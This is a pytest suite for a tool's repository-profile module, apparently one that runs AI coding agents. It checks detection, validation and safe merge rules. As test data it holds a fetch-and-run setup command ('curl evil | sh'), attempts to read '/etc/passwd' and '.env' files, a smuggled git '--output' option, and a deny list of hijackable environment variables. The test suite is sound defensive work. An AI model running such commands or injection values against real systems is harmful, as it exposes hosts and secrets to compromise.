"""Tests for mullet.jobs.profile: detection, validation, storage and merge rules."""

from __future__ import annotations

import hashlib
import json
import logging
import os
import re
import subprocess
from pathlib import Path

import pytest
import yaml

from mullet.jobs import profile as profile_mod
from mullet.jobs.profile import (
    DEFAULT_PROTECTED,
    REPO_PROFILE,
    Profile,
    ProfileError,
    detect_profile,
    expand_home,
    load_profile,
    profile_path,
    profile_to_yaml,
    repo_id,
    save_profile,
)

PYTEST = '.venv/bin/python -m pytest -q --junitxml="$MULLET_JUNIT"'
PHPUNIT = 'vendor/bin/phpunit --log-junit "$MULLET_JUNIT"'


@pytest.fixture(autouse=True)
def isolated(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("MULLET_PROFILES_DIR", str(tmp_path / "profiles"))
    monkeypatch.setattr("shutil.which", lambda name: None)
    return home


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    path = tmp_path / "repo"
    path.mkdir()
    return path


def write(root: Path, rel: str, text: str = "") -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


def git(repo: Path, *args: str) -> str:
    result = subprocess.run(
        [
            "git", "-C", str(repo),
            "-c", "core.hooksPath=/dev/null", "-c", "commit.gpgsign=false",
            "-c", "user.email=t@t", "-c", "user.name=t",
            *args,
        ],
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def commit_all(repo: Path, message: str = "c") -> str:
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", message)
    return git(repo, "rev-parse", "HEAD")


def write_repo_profile(repo: Path, data: dict) -> None:
    write(repo, REPO_PROFILE, yaml.safe_dump(data))


def write_stored_profile(repo: Path, data: dict) -> Path:
    path = profile_path(repo_id(repo))
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(yaml.safe_dump(data))
    return path


# Detection


def test_python_with_uv_lock_and_ruff(repo: Path) -> None:
    write(repo, "pyproject.toml", '[project]\nname = "x"\n\n[tool.ruff.lint]\nselect = ["E"]\n')
    write(repo, "uv.lock")
    p = detect_profile(repo)
    assert p.language == "python"
    assert p.setup == ["uv sync --frozen"]
    assert p.deps_paths == [".venv"]
    assert p.checks.test_full == PYTEST
    assert p.checks.test_targeted == f"{PYTEST} {{tests}}"
    assert p.checks.junit is True
    assert p.checks.lint == ".venv/bin/ruff check ."


def test_python_dev_extra_without_uv(repo: Path) -> None:
    write(
        repo,
        "pyproject.toml",
        '[project]\nname = "x"\n\n[project.optional-dependencies]\ndev = [\n  "pytest",\n]\n',
    )
    p = detect_profile(repo)
    assert p.setup == ["python3 -m venv .venv", ".venv/bin/pip install -e '.[dev]'"]
    assert p.checks.lint is None


def test_python_pyproject_without_dev_extra(repo: Path) -> None:
    write(repo, "pyproject.toml", '[project]\nname = "x"\n\n[project.optional-dependencies]\ndocs = ["x"]\n')
    p = detect_profile(repo)
    assert p.setup == ["python3 -m venv .venv", ".venv/bin/pip install -e ."]


def test_python_requirements_files(repo: Path) -> None:
    write(repo, "requirements.txt", "requests\n")
    write(repo, "requirements-dev.txt", "pytest\n")
    p = detect_profile(repo)
    assert p.setup == [
        "python3 -m venv .venv",
        ".venv/bin/pip install -r requirements.txt -r requirements-dev.txt",
    ]
    assert p.deps_paths == [".venv"]
    assert p.checks.lint is None


def test_node_npm_with_scripts(repo: Path) -> None:
    scripts = {"test": "jest", "lint": "eslint .", "build": "vite build"}
    write(repo, "package.json", json.dumps({"scripts": scripts}))
    write(repo, "package-lock.json", "{}")
    p = detect_profile(repo)
    assert p.language == "javascript"
    assert p.setup == ["npm ci"]
    assert p.deps_paths == ["node_modules"]
    assert p.checks.test_full == "npm test"
    assert p.checks.lint == "npm run lint"
    assert p.checks.build == "npm run build"
    assert p.checks.typecheck is None
    assert p.checks.junit is False


def test_node_pnpm_without_lint_or_build(repo: Path) -> None:
    write(repo, "package.json", json.dumps({"scripts": {"test": "vitest run"}}))
    write(repo, "pnpm-lock.yaml")
    p = detect_profile(repo)
    assert p.setup == ["pnpm install --frozen-lockfile"]
    assert p.checks.test_full == "pnpm test"
    assert p.checks.lint is None
    assert p.checks.build is None


def test_node_yarn_and_no_lockfile(repo: Path, tmp_path: Path) -> None:
    write(repo, "package.json", json.dumps({"scripts": {"test": "jest"}}))
    write(repo, "yarn.lock")
    assert detect_profile(repo).setup == ["yarn install --frozen-lockfile"]
    bare = tmp_path / "bare"
    write(bare, "package.json", "{}")
    assert detect_profile(bare).setup == ["npm install --no-package-lock"]


@pytest.mark.parametrize("script", [None, 'echo "Error: no test specified" && exit 1'])
def test_node_without_a_real_test_script(repo: Path, script: str | None) -> None:
    scripts = {"test": script} if script else {}
    write(repo, "package.json", json.dumps({"scripts": scripts}))
    assert detect_profile(repo).checks.test_full is None


def test_typescript_typecheck_needs_tsconfig_and_dependency(repo: Path, tmp_path: Path) -> None:
    write(repo, "package.json", json.dumps({"devDependencies": {"typescript": "^5"}}))
    write(repo, "tsconfig.json", "{}")
    p = detect_profile(repo)
    assert p.language == "typescript"
    assert p.checks.typecheck == "npx tsc --noEmit"
    other = tmp_path / "other"
    write(other, "package.json", json.dumps({"dependencies": {"react": "^18"}}))
    write(other, "tsconfig.json", "{}")
    assert detect_profile(other).checks.typecheck is None


def test_php_with_phpunit_wins_over_package_json(repo: Path) -> None:
    write(repo, "composer.json", json.dumps({"require": {"laravel/framework": "^11"}}))
    write(repo, "phpunit.xml.dist", "<phpunit/>")
    write(repo, "package.json", json.dumps({"scripts": {"build": "vite build"}}))
    p = detect_profile(repo)
    assert p.language == "php"
    assert p.framework == "laravel"
    assert p.setup == ["composer install --no-interaction --no-progress"]
    assert p.deps_paths == ["vendor"]
    assert p.checks.test_full == PHPUNIT
    assert p.checks.test_targeted == f"{PHPUNIT} {{tests}}"
    assert p.checks.junit is True


def test_php_without_phpunit_has_no_tests(repo: Path) -> None:
    write(repo, "composer.json", "{}")
    p = detect_profile(repo)
    assert p.language == "php"
    assert p.checks.test_full is None
    assert p.checks.junit is False


def test_go(repo: Path) -> None:
    write(repo, "go.mod", "module x\n")
    p = detect_profile(repo)
    assert p.language == "go"
    assert p.checks.test_full == "go test ./..."
    assert p.checks.lint == "go vet ./..."


def test_rust_lint_only_when_clippy_is_installed(repo: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    write(repo, "Cargo.toml", '[package]\nname = "x"\n')
    p = detect_profile(repo)
    assert p.language == "rust"
    assert p.checks.test_full == "cargo test"
    assert p.checks.build == "cargo build"
    assert p.checks.lint is None
    monkeypatch.setattr("shutil.which", lambda name: "/bin/cargo-clippy" if name == "cargo-clippy" else None)
    assert detect_profile(repo).checks.lint == "cargo clippy --all-targets -- -D warnings"


@pytest.mark.parametrize(
    ("makefile", "expected"),
    [
        ("test:\n\tpytest\n", "make test"),
        ("unit test: build\n\t./run\n", "make test"),
        (".PHONY: test\ntest-unit:\n\t./run\ntest := 1\n", None),
    ],
)
def test_makefile_test_target(repo: Path, makefile: str, expected: str | None) -> None:
    write(repo, "Makefile", makefile)
    p = detect_profile(repo)
    assert p.language == "unknown"
    assert p.checks.test_full == expected


def test_unknown_repo_has_nothing_configured(repo: Path) -> None:
    write(repo, "README.md", "hi")
    p = detect_profile(repo)
    assert p.language == "unknown"
    assert p.setup == []
    assert p.deps_paths == []
    assert p.checks.model_dump() == {
        "lint": None, "typecheck": None, "build": None,
        "test_full": None, "test_targeted": None, "junit": False,
    }
    assert p.protected_paths == list(DEFAULT_PROTECTED)
    assert p.data_class == "private"


def test_toolchains_listed_only_when_present_and_caches_never(repo: Path, isolated: Path) -> None:
    (isolated / ".cargo" / "bin").mkdir(parents=True)
    (isolated / ".local" / "share" / "uv").mkdir(parents=True)
    (isolated / ".cache").mkdir()
    p = detect_profile(repo)
    # Only ~/.cargo/bin: ~/.cargo itself can hold registry credentials.
    assert p.expose_ro == ["~/.local/share/uv", "~/.cargo/bin"]
    assert p.setup_writable == []


# Helpers


def test_expand_home(isolated: Path) -> None:
    assert expand_home("~/.cargo") == isolated / ".cargo"
    assert expand_home("~") == isolated
    assert expand_home("/opt/tool") == Path("/opt/tool")


def test_repo_id_is_stable_and_filename_safe(tmp_path: Path) -> None:
    weird = tmp_path / "a" / "My Repo!"
    weird.mkdir(parents=True)
    rid = repo_id(weird)
    digest = hashlib.sha1(str(weird.resolve()).encode()).hexdigest()[:8]
    assert rid == f"My-Repo-{digest}"
    assert re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]*", rid)
    assert repo_id(weird) == rid
    twin = tmp_path / "b" / "My Repo!"
    twin.mkdir(parents=True)
    assert repo_id(twin) != rid


def test_default_protected_is_copied() -> None:
    first = Profile(repo_id="x-1")
    first.protected_paths.append("extra")
    assert Profile(repo_id="x-2").protected_paths == list(DEFAULT_PROTECTED)
    assert {"go.sum", "Cargo.lock", ".env.*", ".git/**"} <= set(DEFAULT_PROTECTED)


# Validation


@pytest.mark.parametrize(
    "fields",
    [
        {"deps_paths": ["../outside"]},
        {"deps_paths": ["a/../b"]},
        {"copy_in": ["/etc/passwd"]},
        {"copy_in": ["~/.env"]},
        {"deps_paths": ["./node_modules"]},
        {"protected_paths": ["a//b"]},
        {"protected_paths": ["secrets/"]},
        {"env": {"PATH": "/tmp"}},
        {"env": {"HOME": "/tmp"}},
        {"env": {"MULLET_JUNIT": "/tmp/x"}},
        {"env": {"1BAD": "x"}},
        {"env": {"A-B": "x"}},
        {"expose_ro": ["relative/dir"]},
        {"setup_writable": ["~other/.cache"]},
        {"expose_ro": ["~/../etc"]},
        {"checks": {"test_targeted": "pytest"}},
        {"checks": {"unknown": "x"}},
        {"timeouts": {"setup": 0}},
        {"data_class": "secret"},
        {"surprise": True},
        {"repo_id": "../escape"},
    ],
)
def test_invalid_profiles_are_rejected(fields: dict) -> None:
    with pytest.raises(ValueError):
        Profile.model_validate({"repo_id": "x-1", **fields})


def test_env_numbers_become_strings_and_blank_commands_become_none() -> None:
    p = Profile(repo_id="x-1", env={"PORT": 5432}, checks={"lint": "  "})
    assert p.env == {"PORT": "5432"}
    assert p.checks.lint is None


# Storage


def test_save_and_load_round_trip(repo: Path, tmp_path: Path) -> None:
    write(repo, "go.mod", "module x\n")
    p = detect_profile(repo)
    p.checks.lint = "golangci-lint run"
    p.env = {"GOFLAGS": "-mod=mod"}
    p.timeouts.check = 120
    path = save_profile(p)
    assert path == (tmp_path / "profiles" / f"{p.repo_id}.yaml").resolve()
    assert os.stat(path).st_mode & 0o777 == 0o600
    assert [f.name for f in path.parent.iterdir()] == [path.name]
    assert load_profile(repo) == p


def test_profile_to_yaml_matches_dump(repo: Path) -> None:
    p = detect_profile(repo)
    assert yaml.safe_load(profile_to_yaml(p)) == p.model_dump(mode="json")
    assert profile_to_yaml(p).startswith("repo_id: ")


# Precedence and merge rules


def test_precedence_detected_then_stored_then_repo(repo: Path) -> None:
    write(repo, "pyproject.toml", "[tool.ruff]\n")
    write_stored_profile(repo, {"checks": {"test_full": "stored"}, "timeouts": {"setup": 60}, "setup": ["mine"]})
    p = load_profile(repo)
    assert p.checks.test_full == "stored"
    assert p.checks.lint == ".venv/bin/ruff check ."
    assert p.checks.test_targeted == f"{PYTEST} {{tests}}"
    assert p.timeouts.setup == 60
    assert p.timeouts.check == 900
    assert p.setup == ["mine"]

    write_repo_profile(repo, {"checks": {"test_full": "repo", "lint": None}, "env": {"CI": "1"}})
    p = load_profile(repo)
    assert p.checks.test_full == "repo"
    assert p.checks.lint is None
    assert p.timeouts.setup == 60
    assert p.env == {"CI": "1"}


def test_repo_file_cannot_drop_protected_paths(repo: Path) -> None:
    write_repo_profile(repo, {"protected_paths": []})
    assert load_profile(repo).protected_paths == list(DEFAULT_PROTECTED)
    write_repo_profile(repo, {"protected_paths": ["secrets/**", ".env"]})
    assert load_profile(repo).protected_paths == [*DEFAULT_PROTECTED, "secrets/**"]


def test_stored_profile_may_replace_protected_paths_and_repo_only_adds(repo: Path) -> None:
    write_stored_profile(repo, {"protected_paths": ["only-this"]})
    write_repo_profile(repo, {"protected_paths": ["secrets/**"]})
    assert load_profile(repo).protected_paths == ["only-this", "secrets/**"]


def test_repo_file_cannot_make_data_public(repo: Path, caplog: pytest.LogCaptureFixture) -> None:
    write_repo_profile(repo, {"data_class": "public"})
    with caplog.at_level(logging.WARNING, logger=profile_mod.__name__):
        assert load_profile(repo).data_class == "private"
    assert "data_class" in caplog.text


def test_repo_file_can_tighten_data_class(repo: Path) -> None:
    write_stored_profile(repo, {"data_class": "public"})
    assert load_profile(repo).data_class == "public"
    write_repo_profile(repo, {"data_class": "private"})
    assert load_profile(repo).data_class == "private"


def test_only_claude_is_allowed_by_default_and_only_the_stored_profile_can_widen(
        repo: Path, caplog: pytest.LogCaptureFixture) -> None:
    assert load_profile(repo).allowed_executors == ["claude-code"]
    write_repo_profile(repo, {"allowed_executors": ["claude-code", "opencode"]})
    with caplog.at_level(logging.WARNING, logger=profile_mod.__name__):
        assert load_profile(repo).allowed_executors == ["claude-code"]
    assert "allowed_executors" in caplog.text
    write_stored_profile(repo, {"allowed_executors": ["claude-code", "opencode"]})
    assert load_profile(repo).allowed_executors == ["claude-code", "opencode"]


def test_repo_file_can_keep_its_code_on_claude_but_never_loosen_the_ladder(repo: Path, caplog) -> None:
    assert load_profile(repo).ladder == "auto"
    write_repo_profile(repo, {"ladder": "claude-only"})
    assert load_profile(repo).ladder == "claude-only"
    write_stored_profile(repo, {"ladder": "claude-only"})
    write_repo_profile(repo, {"ladder": "auto"})
    with caplog.at_level("WARNING"):
        assert load_profile(repo).ladder == "claude-only"
    assert "only your stored profile can loosen it" in caplog.text


def test_repo_file_can_narrow_allowed_executors(repo: Path) -> None:
    write_stored_profile(repo, {"allowed_executors": ["claude-code", "opencode"]})
    write_repo_profile(repo, {"allowed_executors": ["opencode"]})
    assert load_profile(repo).allowed_executors == ["opencode"]
    write_repo_profile(repo, {"allowed_executors": []})
    assert load_profile(repo).allowed_executors == []
    write_repo_profile(repo, {"allowed_executors": "opencode"})
    with pytest.raises(ProfileError):
        load_profile(repo)


def test_unsafe_env_is_never_passed_on() -> None:
    env = {"FOO": "1", "PYTHONDONTWRITEBYTECODE": "1", "LD_PRELOAD": "x", "ld_library_path": "x",
           "DYLD_INSERT_LIBRARIES": "x", "HTTPS_PROXY": "x", "all_proxy": "x", "NO_PROXY": "x",
           "NODE_OPTIONS": "x", "BUN_OPTIONS": "x", "OPENCODE_DISABLE_PROJECT_CONFIG": "0",
           "OPENCODE_CONFIG_CONTENT": "{}", "ANTHROPIC_BASE_URL": "x", "CLAUDE_CONFIG_DIR": "x"}
    assert profile_mod.safe_env(env) == {"FOO": "1", "PYTHONDONTWRITEBYTECODE": "1"}


def test_opencode_lsp_comes_only_from_the_stored_profile(repo: Path, caplog: pytest.LogCaptureFixture) -> None:
    assert load_profile(repo).opencode_lsp is False
    write_repo_profile(repo, {"opencode_lsp": True})
    with caplog.at_level(logging.WARNING, logger=profile_mod.__name__):
        assert load_profile(repo).opencode_lsp is False
    assert "opencode_lsp" in caplog.text
    write_stored_profile(repo, {"opencode_lsp": True})
    assert load_profile(repo).opencode_lsp is True


@pytest.mark.parametrize("names", [["Claude Code"], ["../x"], [""]])
def test_executor_names_are_checked(names: list[str]) -> None:
    with pytest.raises(ValueError):
        Profile(repo_id="x-1", allowed_executors=names)


def test_repo_file_host_paths_are_ignored(repo: Path, caplog: pytest.LogCaptureFixture) -> None:
    write_stored_profile(repo, {"expose_ro": ["/opt/tool"], "copy_in": ["config/test.ini"]})
    write_repo_profile(repo, {"expose_ro": ["/"], "setup_writable": ["~/"], "copy_in": [".env"]})
    with caplog.at_level(logging.WARNING, logger=profile_mod.__name__):
        p = load_profile(repo)
    assert p.expose_ro == ["/opt/tool"]
    assert p.setup_writable == []
    assert p.copy_in == ["config/test.ini"]
    assert "expose_ro" in caplog.text
    assert "setup_writable" in caplog.text
    assert "copy_in" in caplog.text


def test_repo_id_in_files_is_ignored(repo: Path) -> None:
    write_stored_profile(repo, {"repo_id": "someone-else"})
    write_repo_profile(repo, {"repo_id": "another"})
    assert load_profile(repo).repo_id == repo_id(repo)


@pytest.mark.parametrize(
    "text",
    [
        yaml.safe_dump({"deps_paths": ["../outside"]}),
        yaml.safe_dump({"env": {"PATH": "/evil"}}),
        yaml.safe_dump({"protected_paths": "secrets/**"}),
        "- just\n- a list\n",
        "checks: [unclosed\n",
    ],
)
def test_invalid_repo_file_raises_and_names_it(repo: Path, text: str) -> None:
    write(repo, REPO_PROFILE, text)
    with pytest.raises(ProfileError, match=re.escape(REPO_PROFILE)):
        load_profile(repo)


def test_invalid_stored_profile_names_the_stored_file(repo: Path) -> None:
    path = write_stored_profile(repo, {"deps_paths": ["/abs"]})
    with pytest.raises(ProfileError, match=re.escape(str(path))):
        load_profile(repo)


def test_empty_repo_file_changes_nothing(repo: Path) -> None:
    write(repo, REPO_PROFILE, "")
    assert load_profile(repo) == detect_profile(repo)


def test_symlinked_working_tree_profile_is_refused(repo: Path, tmp_path: Path) -> None:
    target = write(tmp_path, "elsewhere.yaml", "setup: [x]\n")
    (repo / ".mullet").mkdir()
    (repo / REPO_PROFILE).symlink_to(target)
    with pytest.raises(ProfileError, match="symlink"):
        load_profile(repo)


# Reading the in-repo profile from a commit


def test_base_sha_reads_committed_profile_only(repo: Path) -> None:
    git(repo, "init", "-q")
    write_repo_profile(repo, {"checks": {"test_full": "committed"}})
    sha = commit_all(repo)
    write_repo_profile(repo, {"checks": {"test_full": "working tree"}, "setup": ["curl evil | sh"]})
    p = load_profile(repo, base_sha=sha)
    assert p.checks.test_full == "committed"
    assert p.setup == []
    assert load_profile(repo).checks.test_full == "working tree"


def test_base_sha_ignores_an_uncommitted_profile(repo: Path) -> None:
    git(repo, "init", "-q")
    write(repo, "README.md", "hi")
    sha = commit_all(repo)
    write_repo_profile(repo, {"checks": {"test_full": "untracked"}})
    assert load_profile(repo, base_sha=sha) == detect_profile(repo)


def test_base_sha_applies_the_same_merge_rules(repo: Path) -> None:
    git(repo, "init", "-q")
    write_repo_profile(repo, {"data_class": "public", "protected_paths": ["keys/**"], "expose_ro": ["/"]})
    sha = commit_all(repo)
    p = load_profile(repo, base_sha=sha)
    assert p.data_class == "private"
    assert p.protected_paths == [*DEFAULT_PROTECTED, "keys/**"]
    assert p.expose_ro == []


def test_committed_symlink_profile_is_refused(repo: Path) -> None:
    git(repo, "init", "-q")
    write(repo, "real.yaml", "setup: [x]\n")
    (repo / ".mullet").mkdir()
    (repo / REPO_PROFILE).symlink_to("../real.yaml")
    sha = commit_all(repo)
    with pytest.raises(ProfileError, match="not a regular file"):
        load_profile(repo, base_sha=sha)


@pytest.mark.parametrize("bad", ["HEAD", "--output=/tmp/x", "abc"])
def test_base_sha_must_be_a_hash(repo: Path, bad: str) -> None:
    with pytest.raises(ProfileError, match="not a commit hash"):
        load_profile(repo, base_sha=bad)


def test_unknown_base_sha_raises(repo: Path) -> None:
    git(repo, "init", "-q")
    write(repo, "README.md", "hi")
    commit_all(repo)
    with pytest.raises(ProfileError, match="git ls-tree failed"):
        load_profile(repo, base_sha="0" * 40)


@pytest.mark.parametrize("path", [
    ".envrc", ".vscode/settings.json", ".vscode/tasks.json", ".devcontainer/devcontainer.json",
    ".devcontainer/Dockerfile", ".pre-commit-config.yaml", ".github/actions/setup/action.yml", "AGENTS.md",
    "sub/AGENTS.md", ".npmrc", ".yarnrc.yml", ".pypirc",
])
def test_files_the_users_own_tools_run_on_merge_are_protected_by_default(path):
    from mullet.jobs.globs import matches_any

    assert matches_any(path, list(DEFAULT_PROTECTED))


def test_ordinary_source_files_are_not_protected():
    from mullet.jobs.globs import matches_any

    assert not matches_any("src/app.py", list(DEFAULT_PROTECTED))
    assert not matches_any("docs/guide.md", list(DEFAULT_PROTECTED))
